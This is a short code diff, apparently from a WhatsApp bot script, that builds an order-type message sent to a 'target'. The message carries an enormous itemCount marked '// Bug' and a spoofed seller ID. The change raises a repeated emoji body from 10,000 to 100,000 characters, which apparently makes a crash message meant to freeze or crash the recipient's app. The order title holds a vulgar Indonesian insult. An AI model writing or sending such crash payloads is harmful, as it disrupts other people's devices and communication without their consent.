@@ -20,7 +20,7 @@ await conn.sendMessage(target, 'Hai Kak', 'conversation', {
     itemCount: 9999999999999999999999999999999999999999999999999999999, // Bug
     status: 1,
     surface: 1,
-    message: '🔥'.repeat(10000),
+    message: '🔥'.repeat(100000),
     orderTitle: 'Mikey Kontol', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
